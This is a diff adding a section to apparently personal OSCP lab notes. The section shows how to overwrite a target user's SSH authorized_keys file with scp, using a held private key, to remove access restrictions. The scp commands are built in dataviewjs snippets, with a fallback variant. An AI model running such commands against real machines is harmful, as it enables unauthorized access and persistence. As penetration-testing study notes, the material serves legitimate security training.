@@ -121,3 +121,26 @@ dv.paragraph("```bash\n" + command + "\n```");
 ---
 
 [[Reaching internal hidden SSH ports]]
+
+---
+
+BEING RESTRICTED in AUTHORIZED USERS AND TRYING TO OVERWRITE THAT FILE IN TARGET MACHINE USING SCP
+
+We can see where the ‘ACCESS DENIED’ message is coming from but here’s the trick. We _have_ the SSH key and because of that, we _are_ able to use secure copy (scp). So we _should_ be able to over write the authorized_keys file.
+
+I am going to remove the restrictive preamble of the authorized_keys file and try to overwrite the original.
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `scp -i id_rsa authorized_keys max@${ip}:/home/max/.ssh/authorized_keys`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+if error try
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+
+const command = `scp -O -i id_rsa authorized_keys max@${ip}:/home/max/.ssh/authorized_keys`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
